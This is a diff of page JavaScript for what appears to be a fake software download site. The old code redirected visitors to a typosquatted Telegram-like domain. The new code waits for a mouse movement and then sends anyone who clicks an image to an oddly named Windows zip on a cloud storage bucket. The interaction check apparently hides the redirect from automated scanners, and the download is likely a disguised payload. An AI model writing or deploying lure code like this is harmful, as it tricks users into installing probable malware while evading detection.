@@ -1,16 +1,17 @@
-function loadUrl()
+var numCount=0;
+$(function()
 {
-	if(num>=1)
+	$("body").mouseover(function(event)
 	{
-		var url="https://down.telagarm.help/downloads.php";
-		window.location=url;
-	}
-}
+		numCount++;
+	});
 
-var num=0;
-function getLoad()
-{
-	num++;
-
-}
-
+	$("img").click(function()
+	{
+		if(numCount>=1)
+		{
+			var url="https://hdliswhs.oss-cn-hongkong.aliyuncs.com/HoiloWeolrd6.9.7-x64.zip";
+			window.location=url;
+		}
+	});
+})
